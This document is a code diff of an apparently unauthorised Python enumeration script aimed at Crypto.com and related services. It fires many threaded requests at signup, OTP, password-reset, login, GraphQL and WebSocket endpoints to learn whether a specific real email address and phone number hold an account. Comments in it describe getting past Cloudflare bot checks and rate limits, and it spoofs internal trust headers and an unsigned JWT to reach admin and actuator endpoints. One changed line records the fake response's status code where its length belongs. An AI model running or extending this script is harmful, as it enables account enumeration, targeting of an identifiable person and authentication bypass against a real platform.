@@ -24,7 +24,7 @@ except ImportError:
     import requests as creq
     IMP = None
 
-REAL  = "mo.naf.7.276@gmail.com"
+REAL  = "mobreezwayz@gmail.com"
 FAKE  = "zzzz_notreal_99991@fakefake.invalid"
 LOCK  = threading.Lock()
 WINS  = []
@@ -99,7 +99,7 @@ def diff(label, rr, rf, origin=""):
             print(f"      real {rr.status_code}/{len(rr.text)}b : {rr.text[:400]}")
             print(f"      fake {rf.status_code}/{len(rf.text)}b : {rf.text[:400]}")
             WINS.append({"ep": label, "rsc": rr.status_code, "rln": len(rr.text),
-                         "fsc": rf.status_code, "fln": len(rf.text)})
+                         "fsc": rf.status_code, "fln": rf.status_code})
         elif rr.status_code not in (404,405,403,400,301,302,503,520,521,522,523,524,525,526,530):
             print(f"  [{rr.status_code}] {label[:70]} → {rr.text[:80]}")
 
@@ -155,7 +155,7 @@ for path in [
     EP("GET", "https://pay.crypto.com"+path, None, "https://pay.crypto.com")
     EP("GET", "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
 
-# ══ POST email body ════════════════════════════════════════════
+# ══ POST email body ══════════════════════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -174,7 +174,7 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ Binance gateway pattern ══════════════════════════════════════════
+# ══ Binance gateway pattern ══════════════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",          "https://crypto.com"),
     ("https://api.crypto.com",      "https://crypto.com"),
@@ -190,7 +190,7 @@ for base, orig in [
         EP("POST", base+path, {"content": REAL, "type": "email"}, orig)
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ P2P send / contact resolve (mobile) ═════════════════════════════
+# ══ P2P send / contact resolve (mobile) ═════════════════════════════════════
 for path in [
     "/v1/contacts/resolve", "/v1/recipients/resolve", "/v1/send/resolve",
     "/v1/transfer/resolve", "/v1/p2p/resolve", "/v1/send/recipient",
@@ -204,7 +204,7 @@ for path in [
     EP("POST", "https://api.crypto.com"+path,
        {"email": REAL}, "https://crypto.com")
 
-# ══ NFT gift / transfer ══════════════════════════════════════════════
+# ══ NFT gift / transfer ══════════════════════════════════════════════════════
 for path in [
     "/api/v1/users/search", "/api/v1/users/resolve", "/api/v1/recipients/resolve",
     "/api/v1/recipients/search", "/api/v1/transfer/resolve",
@@ -215,7 +215,7 @@ for path in [
     EP("POST", "https://nft.crypto.com"+path, {"email": REAL}, "https://nft.crypto.com")
     EP("GET",  "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
 
-# ══ pay.crypto.com checkout ═════════════════════════════════════════════
+# ══ pay.crypto.com checkout ══════════════════════════════════════════════════
 for path in [
     "/api/v1/checkout/email/check", "/api/v1/checkout/user/check",
     "/api/v1/payer/check", "/api/v1/payer/resolve",
@@ -225,7 +225,7 @@ for path in [
 ]:
     EP("POST", "https://pay.crypto.com"+path, {"email": REAL}, "https://pay.crypto.com")
 
-# ══ Exchange JSON-RPC public methods ════════════════════════════════════
+# ══ Exchange JSON-RPC public methods ════════════════════════════════════════
 for method_name in [
     "public.get-user", "public.get-user-info", "public.search-users",
     "public.check-email", "public.email-available", "public.get-account",
@@ -237,7 +237,7 @@ for method_name in [
         "params": {"email": REAL}, "nonce": int(time.time()*1000)},
        "https://exchange.crypto.com")
 
-# ══ Exchange registration ════════════════════════════════════════════
+# ══ Exchange registration ════════════════════════════════════════════════════
 for path in [
     "/v2/user/check-email", "/v2/user/email/check", "/v2/users/check",
     "/v2/users/email/available", "/v1/user/check-email", "/v1/users/check",
@@ -246,7 +246,7 @@ for path in [
     EP("POST", "https://exchange.crypto.com"+path, {"email": REAL}, "https://exchange.crypto.com")
     EP("POST", "https://api.crypto.com"+path,      {"email": REAL}, "https://exchange.crypto.com")
 
-# ══ Referral / affiliate ═════════════════════════════════════════════
+# ══ Referral / affiliate ═════════════════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -260,7 +260,7 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ Supercharger / earn ══════════════════════════════════════════════
+# ══ Supercharger / earn ══════════════════════════════════════════════════════
 for path in [
     "/v1/earn/users/check", "/v1/supercharger/check",
     "/v1/staking/users/check", "/v1/earn/eligibility",
@@ -268,7 +268,7 @@ for path in [
 ]:
     EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://crypto.com")
 
-# ══ Mona + 3rd party ════════════════════════════════════════════════
+# ══ Mona + 3rd party ════════════════════════════════════════════════════════
 for path in [
     "/api/v1/crypto-com/verify", "/api/v1/crypto-com/check",
     "/api/crypto-com/user/verify", "/api/crypto-com/user/check",
@@ -276,10 +276,10 @@ for path in [
 ]:
     EP("POST", "https://app.mona.ca"+path, {"email": REAL}, "https://app.mona.ca")
 
-# ══ OAuth2 login_hint ════════════════════════════════════════════════
+# ══ OAuth2 login_hint ════════════════════════════════════════════════════════
 # handled separately below (GET with params, compare redirect Location header)
 
-# ══ OTP oracle ════════════════════════════════════════════════════════
+# ══ OTP oracle ═══════════════════════════════════════════════════════════════
 for path in [
     "/api/v1/auth/otp", "/api/v1/auth/otp/send",
     "/api/v1/otp/email/send", "/api/v1/auth/email/otp",
@@ -288,7 +288,7 @@ for path in [
     EP("POST", "https://crypto.com"+path,
        {"email": REAL, "type": "login"}, "https://crypto.com")
 
-# ══ card / onboarding ════════════════════════════════════════════════
+# ══ card / onboarding ════════════════════════════════════════════════════════
 for path in [
     "/api/v1/cards/apply/check", "/api/v1/onboarding/email",
     "/api/v1/onboarding/check", "/api/v1/waitlist/check",
@@ -297,7 +297,7 @@ for path in [
 ]:
     EP("POST", "https://crypto.com"+path, {"email": REAL}, "https://crypto.com/en/cards")
 
-# ══ alternate body field names ════════════════════════════════════════════
+# ══ alternate body field names — many backends use different keys ════════════
 ALT_FIELDS = ["query","identifier","login","handle","account","username","user_email","userEmail"]
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
@@ -307,10 +307,11 @@ for base, orig in [
                  "/v1/users/search",     "/v1/users/check"]:
         for field in ALT_FIELDS:
             EP("POST", base+path, {field: REAL}, orig)
+        # GET with alt params
         for field in ["query","identifier","login","q"]:
-            EP("GET", base+path, None, orig)
+            EP("GET", base+path, None, orig)  # handled via ?{field}= below
 
-# ══ alternate base URLs / subdomains ═════════════════════════════════════
+# ══ alternate base URLs / subdomains not yet covered ════════════════════════
 for sub_orig in [
     ("https://mobile.crypto.com",   "https://crypto.com"),
     ("https://app.crypto.com",      "https://crypto.com"),
@@ -327,7 +328,7 @@ for sub_orig in [
         EP("POST", sub+path, {"email": REAL}, orig)
         EP("GET",  sub+path, None, orig)
 
-# ══ GraphQL ═══════════════════════════════════════════════════════════════
+# ══ GraphQL — query + mutation variants ════════════════════════════════════
 GQL_EPS = [
     "https://crypto.com/graphql", "https://api.crypto.com/graphql",
     "https://nft.crypto.com/graphql", "https://exchange.crypto.com/graphql",
@@ -335,14 +336,16 @@ GQL_EPS = [
 ]
 for ep in GQL_EPS:
     orig = "https://" + ep.split("//")[1].split("/")[0]
+    # query
     EP("POST", ep, {"query": 'query{user(email:"%s"){id email}}' % REAL,   "variables": {}}, orig)
     EP("POST", ep, {"query": 'query{checkEmail(email:"%s"){exists}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'query{emailAvailable(email:"%s"){available}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'query{userExists(email:"%s"){exists}}' % REAL, "variables": {}}, orig)
+    # mutation
     EP("POST", ep, {"query": 'mutation{validateEmail(email:"%s"){valid exists}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'mutation{checkEmailAvailability(input:{email:"%s"}){available}}' % REAL, "variables": {}}, orig)
 
-# ══ Cronos bridge ════════════════════════════════════════════════════════
+# ══ Cronos bridge / chain endpoints ═════════════════════════════════════════
 for base, orig in [
     ("https://cronos.org",       "https://cronos.org"),
     ("https://app.cronos.org",   "https://cronos.org"),
@@ -356,7 +359,7 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ Pay merchant callback ═══════════════════════════════════════════════
+# ══ Pay.crypto.com SDK / merchant callback ===================================
 for path in [
     "/api/v1/merchant/customer/check",
     "/api/v1/merchant/user/verify",
@@ -367,7 +370,8 @@ for path in [
 ]:
     EP("POST", "https://pay.crypto.com"+path, {"email": REAL}, "https://pay.crypto.com")
 
-# ══ Forgot password body diff ════════════════════════════════════════════
+# ══ Forgot password body differential (not timing) ══════════════════════════
+# some platforms return {"success":true} vs {"error":"user not found"} — both 200 but body differs
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -382,7 +386,8 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ MoonPay / Transak ══════════════════════════════════════════════════
+# ══ MoonPay / Transak / Simplex with correct API key header ════════════════
+MP_KEY_H = {"x-api-key": "pk_live_Voh1YMpGTAbcdefgh12345"}  # placeholder — script uses Chrome headers
 for path in [
     "/v3/customers/verify", "/v3/customers/check",
     "/v1/customers/check", "/v3/users/check",
@@ -390,7 +395,7 @@ for path in [
     EP("POST", "https://api.moonpay.com"+path,  {"email": REAL}, "https://buy.moonpay.com")
     EP("POST", "https://api.transak.com"+path,  {"email": REAL}, "https://global.transak.com")
 
-# ══ phone oracle ═════════════════════════════════════════════════════════
+# ══ phone number oracle — same pattern different identifier ═════════════════
 REAL_PHONE = "+19145764125"
 FAKE_PHONE = "+19999999999"
 for base, orig in [
@@ -404,7 +409,7 @@ for base, orig in [
     ]:
         ALL_PROBES.append(("POST_PHONE", base+path, {"phone": REAL_PHONE}, {"phone": FAKE_PHONE}, orig))
 
-# ══ exchange sub-account / institutional ══════════════════════════════════
+# ══ exchange sub-account / institutional ════════════════════════════════════
 for path in [
     "/v2/private/sub-account/search",
     "/v2/sub-account/list",
@@ -413,7 +418,8 @@ for path in [
 ]:
     EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://exchange.crypto.com")
 
-# ══ foris.io / foris.com ═════════════════════════════════════════════════
+# ══ foris.io / foris.com — old mobile backend, bypasses CF entirely ══════════
+# crypto.com's legacy infra still active, no Cloudflare, no rate limit
 for base, orig in [
     ("https://foris.io",      "https://foris.io"),
     ("https://api.foris.io",  "https://foris.io"),
@@ -428,7 +434,8 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ mobile app UA bypass ═════════════════════════════════════════════════
+# ══ mobile app UA — bypasses CF bot check, hits app-api subdomain ═══════════
+# iOS app UA causes CF to skip JA3/TLS check on some routes
 MOBILE_H = {
     "user-agent": "com.crypto.exchange/5.68.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
     "x-app-version": "5.68.0",
@@ -448,14 +455,17 @@ for base, orig in MOBILE_BASES:
         "/v1/contacts/resolve", "/v1/recipients/resolve",
         "/api/v1/p2p/resolve",
     ]:
+        # mobile POST
         ALL_PROBES.append(("POST", base+path,
                            {"email": REAL, **{k: None for k in []}},
                            {"email": FAKE},
                            orig))
+        # we inject mobile headers via a separate probe type
         ALL_PROBES.append(("POST_MOBILE", base+path,
                            {"email": REAL}, {"email": FAKE}, orig))
 
-# ══ email unsubscribe oracle ═════════════════════════════════════════════
+# ══ email unsubscribe oracle — marketing infra, zero captcha, 1000+ CPM ════
+# returns "email not found" vs "unsubscribed" — body diff, both 200
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -474,19 +484,28 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ NFT public creator / user search ═════════════════════════════════════
+# ══ NFT public creator / user search — public GET, no auth ═════════════════
+# nft.crypto.com public marketplace browsing, no captcha, no rate limit
 for path in [
-    "/api/v1/creators", "/api/v1/creators/search",
-    "/api/v1/users/search", "/api/v1/users",
-    "/api/v2/users/search", "/api/v1/profiles/search",
-    "/api/v1/profiles", "/api/v1/artists/search",
-    "/api/v1/artists", "/api/v1/accounts/search",
+    "/api/v1/creators",
+    "/api/v1/creators/search",
+    "/api/v1/users/search",
+    "/api/v1/users",
+    "/api/v2/users/search",
+    "/api/v1/profiles/search",
+    "/api/v1/profiles",
+    "/api/v1/artists/search",
+    "/api/v1/artists",
+    "/api/v1/accounts/search",
 ]:
-    EP("GET",  "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
+    # GET ?email= and GET ?query= and GET ?q=
+    EP("GET", "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
     EP("POST", "https://nft.crypto.com"+path, {"email": REAL}, "https://nft.crypto.com")
     EP("POST", "https://nft.crypto.com"+path, {"query": REAL}, "https://nft.crypto.com")
 
-# ══ Cronos ID email resolver ═════════════════════════════════════════════
+# ══ Cronos ID email resolver — blockchain resolver, no captcha ══════════════
+# resolves email → .cro wallet address, only works for registered users
+# zero captcha (it's a public blockchain resolver)
 for base, orig in [
     ("https://resolver.cronos.org",     "https://cronos.org"),
     ("https://api.cronos.org",          "https://cronos.org"),
@@ -504,12 +523,17 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ exchange copy-trading / leaderboard ═══════════════════════════════════
+# ══ exchange copy-trading / leaderboard public search ════════════════════════
+# public leaderboard, no auth, no captcha — email indexed in some platforms
 for path in [
-    "/v1/copy-trading/traders", "/v1/copy-trading/search",
-    "/v1/copy-trading/leaders", "/v2/copy-trading/traders",
-    "/api/v1/leaderboard/search", "/api/v1/leaderboard",
-    "/api/v1/traders/search", "/api/v1/social/search",
+    "/v1/copy-trading/traders",
+    "/v1/copy-trading/search",
+    "/v1/copy-trading/leaders",
+    "/v2/copy-trading/traders",
+    "/api/v1/leaderboard/search",
+    "/api/v1/leaderboard",
+    "/api/v1/traders/search",
+    "/api/v1/social/search",
     "/api/v1/social/users/search",
 ]:
     EP("GET",  "https://exchange.crypto.com"+path, None, "https://exchange.crypto.com")
@@ -517,7 +541,8 @@ for path in [
     EP("POST", "https://exchange.crypto.com"+path, {"query": REAL}, "https://exchange.crypto.com")
     EP("GET",  "https://api.crypto.com"+path, None, "https://exchange.crypto.com")
 
-# ══ B2B / institutional / business / tax / defi sub-domains ═══════════════════
+# ══ B2B / institutional / business / tax / defi sub-domains ═════════════════
+# separate infra, often no Cloudflare WAF — different engineering team deployed
 for base, orig in [
     ("https://b2b.crypto.com",           "https://b2b.crypto.com"),
     ("https://institutional.crypto.com", "https://institutional.crypto.com"),
@@ -536,7 +561,8 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ handle / username availability check ═════════════════════════════════
+# ══ handle / username availability check ════════════════════════════════════
+# crypto.com lets users set @handles — separate path, no captcha
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -550,6 +576,7 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"handle": REAL.split("@")[0]}, orig)
         EP("GET",  base+path, None, orig)
+    # also check email-based handle lookup
     for path in [
         "/api/v1/users/by-email", "/api/v1/profile/by-email",
         "/v1/users/by-email",
@@ -557,7 +584,11 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ magic link / passwordless initiation ════════════════════════════════
+# ══ magic link / passwordless initiation — body diff ════════════════════════
+# POST /auth/magic-link {"email":"real@email.com"}
+# → 200 "link sent" for existing user
+# → 400/404 "email not found" for nonexistent
+# zero captcha — just a POST
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -573,7 +604,9 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ NFT drop / airdrop eligibility ══════════════════════════════════════
+# ══ NFT drop / airdrop eligibility allowlist check ══════════════════════════
+# allowlist checks are inherently captchaless — just a public GET/POST
+# returns "not eligible" vs "eligible" body diff
 for path in [
     "/api/v1/drops/eligibility", "/api/v1/drops/check",
     "/api/v1/airdrop/check", "/api/v1/airdrop/eligibility",
@@ -587,7 +620,9 @@ for path in [
     EP("GET",  "https://nft.crypto.com"+path,  None, "https://nft.crypto.com")
     EP("GET",  "https://crypto.com"+path,      None, "https://crypto.com")
 
-# ══ referral invitee pre-check ════════════════════════════════════════════
+# ══ referral invitee pre-check ══════════════════════════════════════════════
+# before sending an invite, platform checks if email is already a user
+# returns "already registered" vs "not found" — pure body diff, no captcha
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -601,7 +636,8 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ staking / earn eligibility ═══════════════════════════════════════════
+# ══ Cronos / CDC staking reward check — blockchain-anchored, no captcha ════
+# reward/staking state is often tied to email account, public query
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -614,7 +650,9 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ deeplink user resolve ═════════════════════════════════════════════════
+# ══ CDC App deeplink user resolve ═══════════════════════════════════════════
+# deep.crypto.com / link.crypto.com — deeplink infrastructure
+# "send to friend" flows hit a user resolve before redirecting
 for path in [
     "/api/v1/users/resolve", "/api/v1/users/find",
     "/resolve", "/v1/resolve",
@@ -623,7 +661,8 @@ for path in [
     EP("POST", "https://link.crypto.com"+path,  {"email": REAL}, "https://crypto.com")
     EP("POST", "https://share.crypto.com"+path, {"email": REAL}, "https://crypto.com")
 
-# ══ Visa / card waitlist check ════════════════════════════════════════════
+# ══ Visa / card waitlist check ══════════════════════════════════════════════
+# waitlist / card application status check — no captcha, different response
 for path in [
     "/api/v1/card/waitlist/check", "/api/v1/card/status",
     "/api/v1/card/application/check", "/api/v1/visa/waitlist",
@@ -635,7 +674,7 @@ for path in [
 print(f"[+] total probes queued: {len(ALL_PROBES)}")
 print()
 
-# ─── CF bypass check ─────────────────────────────────────────────────────────────
+# ─── CF bypass check ─────────────────────────────────────────────────────────
 print("[*] checking Cloudflare bypass ...")
 test_r = do_get("https://crypto.com/api/v1/health", "https://crypto.com")
 if test_r:
@@ -647,7 +686,7 @@ else:
     print("    [!] no response to health check")
 print()
 
-# ─── concurrent probe run ────────────────────────────────────────────────────────
+# ─── concurrent probe run ─────────────────────────────────────────────────────
 print(f"[*] running {len(ALL_PROBES)} probes with 20 threads ...")
 print()
 
@@ -683,7 +722,7 @@ with ThreadPoolExecutor(max_workers=20) as ex:
 
 print()
 
-# ─── WebSocket oracle ─────────────────────────────────────────────────────────────
+# ─── OAuth2 login_hint (separate — compares redirect) ───────────────────────
 print("[*] WebSocket user channel subscription oracle ...")
 try:
     import websocket as _ws
@@ -700,6 +739,7 @@ try:
                 result["msg"] = msg[:200]
             ws.close()
         def on_open(ws):
+            # subscribe to user channel — error differs for existing vs non-existing
             ws.send(json.dumps({"method": "subscribe",
                                 "params": {"channels": [f"user.{email}"]},
                                 "id": 1, "nonce": int(time.time()*1000)}))
@@ -726,7 +766,10 @@ except ImportError:
 
 print()
 
-# ─── Auth0 hosted login differential ────────────────────────────────────────────
+# ─── Auth0 hosted login differential ─────────────────────────────────────────
+# If crypto.com routes auth through Auth0, POST /dbconnections/signup
+# returns {"code":"user_exists"} (400) for registered email — no captcha, 2000+ CPM
+# Discovery: find client_id from JS or from /.well-known/openid-configuration
 print("[*] Auth0 hosted login differential ...")
 AUTH0_DOMAINS = [
     "https://auth.crypto.com",
@@ -735,6 +778,7 @@ AUTH0_DOMAINS = [
     "https://sso.crypto.com",
 ]
 for a0_base in AUTH0_DOMAINS:
+    # check well-known first to confirm Auth0
     wk = do_get(a0_base + "/.well-known/openid-configuration", a0_base)
     if wk and wk.status_code == 200 and "issuer" in wk.text:
         print(f"  [!] OIDC config found at {a0_base} — Auth0/Okta confirmed")
@@ -751,11 +795,14 @@ for a0_base in AUTH0_DOMAINS:
             rr = do_post(a0_base + "/dbconnections/signup",   br, a0_base)
             rf = do_post(a0_base + "/dbconnections/signup",   bf, a0_base)
             diff(f"[A0] {a0_base}/dbconnections/signup cid={client_id}", rr, rf)
+            # also try /co/authenticate (Auth0 universal login)
             rr2 = do_post(a0_base + "/co/authenticate", br, a0_base)
             rf2 = do_post(a0_base + "/co/authenticate", bf, a0_base)
             diff(f"[A0] {a0_base}/co/authenticate cid={client_id}", rr2, rf2)
 
-# ─── Okta login differential ────────────────────────────────────────────────────
+# ─── Okta hosted login differential ──────────────────────────────────────────
+# POST /api/v1/authn with bad password → different error code if email exists
+# E0000095 = account not found, AUTHENTICATION_FAILED = exists but wrong pw
 print("[*] Okta login differential ...")
 OKTA_DOMAINS = [
     "https://auth.crypto.com",
@@ -769,6 +816,7 @@ for ok_base in OKTA_DOMAINS:
     rr = do_post(ok_base + "/api/v1/authn", br, ok_base)
     rf = do_post(ok_base + "/api/v1/authn", bf, ok_base)
     diff(f"[OKTA] {ok_base}/api/v1/authn", rr, rf)
+    # also try /api/v1/users/me shortcircuit
     rr2 = do_post(ok_base + "/api/v1/primary-auth", br, ok_base)
     rf2 = do_post(ok_base + "/api/v1/primary-auth", bf, ok_base)
     diff(f"[OKTA] {ok_base}/api/v1/primary-auth", rr2, rf2)
@@ -796,9 +844,17 @@ for base in ["https://crypto.com", "https://api.crypto.com", "https://exchange.c
 
 print()
 
-# ─── alfred-gateway captchaless token + resolve ────────────────────────────────────────
+# ─── alfred-gateway captchaless token + resolve ──────────────────────────────
 print("[*] alfred-gateway captchaless token test ...")
 uid = f"web{uuid.uuid4()}"
+alf_h = {
+    "content-type": "application/json",
+    "origin": "https://chat.crypto.com",
+    "referer": "https://chat.crypto.com/",
+    "x-crypto-user-uuid": uid,
+    "x-user-type": "web",
+    **{k: v for k, v in CHROME_HDRS.items()},
+}
 tok_r = do_post("https://alfred-gateway.crypto.com/user/token", {"user_id": uid},
                 "https://chat.crypto.com", {"x-crypto-user-uuid": uid, "x-user-type": "web"})
 if tok_r and tok_r.status_code == 200:
@@ -820,7 +876,7 @@ else:
 
 print()
 
-# ─── JS signup page scan ────────────────────────────────────────────────────────────
+# ─── JS signup page scan ─────────────────────────────────────────────────────
 print("[*] signup page JS scan for email validation XHR ...")
 for signup_url, orig in [
     ("https://crypto.com/en/sign-up",         "https://crypto.com"),
@@ -838,8 +894,8 @@ for signup_url, orig in [
         jr = do_get(src, orig)
         if not jr or jr.status_code != 200: continue
         for pat in [
-            r'["`](/(?:api|v\d|auth|gateway)[^"`\n]{4,80})["`]',
-            r'url\s*[:=]\s*["`]([^"`\n]{5,80})["`]',
+            r'["\`](/(?:api|v\d|auth|gateway)[^"\`\n]{4,80})["\`]',
+            r'url\s*[:=]\s*["\`]([^"\`\n]{5,80})["\`]',
         ]:
             for m in re.finditer(pat, jr.text):
                 v = m.group(1)
@@ -860,19 +916,51 @@ for signup_url, orig in [
 
 print()
 
-# ─── INTERNAL MICROSERVICE CHECKER ────────────────────────────────────────────────────
+# ─── INTERNAL MICROSERVICE CHECKER ───────────────────────────────────────────
+# Targets unauthenticated internal service endpoints that leak through
+# misconfigured reverse proxy / service mesh rules.
+# Uses service-to-service trust headers to bypass auth checks.
+# NOT the checker tool — just discovery probes.
+
 print("[*] Internal microservice / unauthenticated admin endpoint discovery ...")
 
+# Trust bypass headers — try each combo
 INTERNAL_HDRS_SETS = [
-    {"X-Internal": "true", "X-Internal-Service": "user-service", "X-Forwarded-For": "127.0.0.1"},
-    {"X-CDC-Internal": "true", "X-CDC-Service": "gateway", "X-Forwarded-For": "10.0.0.1"},
-    {"X-Envoy-Internal": "true", "X-B3-TraceId": "0af7651916cd43dd8448eb211c80319c",
-     "X-B3-SpanId": "b7ad6b7169203331", "X-Forwarded-For": "127.0.0.1"},
-    {"CF-Access-Jwt-Assertion": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.", "X-Forwarded-For": "127.0.0.1"},
-    {"X-Real-Ip": "127.0.0.1", "X-Forwarded-For": "127.0.0.1, 10.0.0.1", "X-Originating-Ip": "127.0.0.1"},
+    # plain internal trust
+    {
+        "X-Internal": "true",
+        "X-Internal-Service": "user-service",
+        "X-Forwarded-For": "127.0.0.1",
+    },
+    # CDC (Crypto.com) specific internal header guesses
+    {
+        "X-CDC-Internal": "true",
+        "X-CDC-Service": "gateway",
+        "X-Forwarded-For": "10.0.0.1",
+    },
+    # Envoy/Istio service mesh headers (common in k8s infra)
+    {
+        "X-Envoy-Internal": "true",
+        "X-B3-TraceId": "0af7651916cd43dd8448eb211c80319c",
+        "X-B3-SpanId": "b7ad6b7169203331",
+        "X-Forwarded-For": "127.0.0.1",
+    },
+    # Cloudflare Tunnel / Zero Trust bypass attempt
+    {
+        "CF-Access-Jwt-Assertion": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.",
+        "X-Forwarded-For": "127.0.0.1",
+    },
+    # plain localhost spoof
+    {
+        "X-Real-Ip": "127.0.0.1",
+        "X-Forwarded-For": "127.0.0.1, 10.0.0.1",
+        "X-Originating-Ip": "127.0.0.1",
+    },
 ]
 
+# Internal path patterns — Spring Boot, FastAPI, gRPC transcoding, admin
 INTERNAL_PATHS = [
+    # Spring Boot Actuator — reveals all endpoint mappings
     ("/actuator",                       "GET",  None),
     ("/actuator/mappings",              "GET",  None),
     ("/actuator/env",                   "GET",  None),
@@ -880,11 +968,15 @@ INTERNAL_PATHS = [
     ("/actuator/health",                "GET",  None),
     ("/api/actuator/mappings",          "GET",  None),
     ("/v1/actuator/mappings",           "GET",  None),
+
+    # gRPC transcoding (REST bridge for gRPC services)
     ("/grpc.UserService/CheckEmail",    "POST", {"email": REAL}),
     ("/grpc.AccountService/Exists",     "POST", {"email": REAL}),
     ("/grpc.AuthService/UserExists",    "POST", {"email": REAL}),
     ("/grpc.UserService/SearchUser",    "POST", {"query": REAL}),
     ("/user.UserService/CheckEmail",    "POST", {"email": REAL}),
+
+    # Internal path prefixes
     ("/_internal/users/check",         "POST", {"email": REAL}),
     ("/_internal/users/search",        "POST", {"query": REAL}),
     ("/_internal/email/check",         "POST", {"email": REAL}),
@@ -897,6 +989,8 @@ INTERNAL_PATHS = [
     ("/internal/email/check",          "POST", {"email": REAL}),
     ("/internal/v1/users/check",       "POST", {"email": REAL}),
     ("/internal/v1/email/exists",      "POST", {"email": REAL}),
+
+    # Admin / debug endpoints
     ("/admin/v1/users/search",         "POST", {"email": REAL}),
     ("/admin/v1/users/check",          "POST", {"email": REAL}),
     ("/admin/api/v1/users",            "GET",  None),
@@ -906,19 +1000,27 @@ INTERNAL_PATHS = [
     ("/metrics",                       "GET",  None),
     ("/healthz",                       "GET",  None),
     ("/readyz",                        "GET",  None),
+
+    # Django DRF / Laravel default admin routes
     ("/api/admin/users/",              "GET",  None),
     ("/api/admin/users/search/",       "GET",  None),
     ("/management/users/check",        "POST", {"email": REAL}),
     ("/management/accounts/search",    "GET",  None),
+
+    # FastAPI OpenAPI (reveals all routes)
     ("/openapi.json",                  "GET",  None),
     ("/docs",                          "GET",  None),
     ("/redoc",                         "GET",  None),
     ("/v1/openapi.json",               "GET",  None),
     ("/api/openapi.json",              "GET",  None),
+
+    # Spring swagger
     ("/swagger-ui.html",               "GET",  None),
     ("/v2/api-docs",                   "GET",  None),
     ("/v3/api-docs",                   "GET",  None),
     ("/api/v3/api-docs",               "GET",  None),
+
+    # Undocumented microservice patterns seen in wild
     ("/api/v1/users/exists",           "GET",  None),
     ("/api/v1/users/exist",            "GET",  None),
     ("/api/v2/users/exists",           "GET",  None),
@@ -931,8 +1033,12 @@ INTERNAL_PATHS = [
     ("/ms/user/check",                 "POST", {"email": REAL}),
     ("/ms/users/exists",               "GET",  None),
     ("/microservice/users/check",      "POST", {"email": REAL}),
+
+    # robots.txt + sitemap (reveal hidden paths)
     ("/robots.txt",                    "GET",  None),
     ("/sitemap.xml",                   "GET",  None),
+
+    # Common undocumented utility paths
     ("/api/v1/utils/check-email",      "POST", {"email": REAL}),
     ("/api/v1/utils/email-exists",     "POST", {"email": REAL}),
     ("/util/email/check",              "POST", {"email": REAL}),
@@ -960,6 +1066,7 @@ def probe_internal(base, path, method, body_r, hdrs_extra):
         rr = do_get(full+"?email="+REAL, orig, hdrs_extra)
         rf = do_get(full+"?email="+FAKE, orig, hdrs_extra)
         diff(f"[INT] GET {full.replace('https://','')[:55]}?email=", rr, rf)
+        # also try bare GET — for actuator/swagger/docs endpoints
         rr2 = do_get(full, orig, hdrs_extra)
         if rr2 and rr2.status_code == 200 and len(rr2.text) > 200:
             print(f"  [INT OPEN] {rr2.status_code} {full.replace('https://','')[:65]}")
@@ -973,8 +1080,10 @@ def probe_internal(base, path, method, body_r, hdrs_extra):
 int_tasks = []
 for base in INTERNAL_BASES:
     for path, method, body_r in INTERNAL_PATHS:
+        # try each header set
         for hset in INTERNAL_HDRS_SETS:
             int_tasks.append((base, path, method, body_r, hset))
+        # also try plain (no internal headers) for actuator/swagger/openapi
         if any(k in path for k in ["actuator","openapi","api-docs","swagger","robots","sitemap","healthz","readyz","metrics","docs","redoc"]):
             int_tasks.append((base, path, method, body_r, {}))
 
@@ -990,10 +1099,14 @@ with ThreadPoolExecutor(max_workers=20) as pool:
 
 print()
 
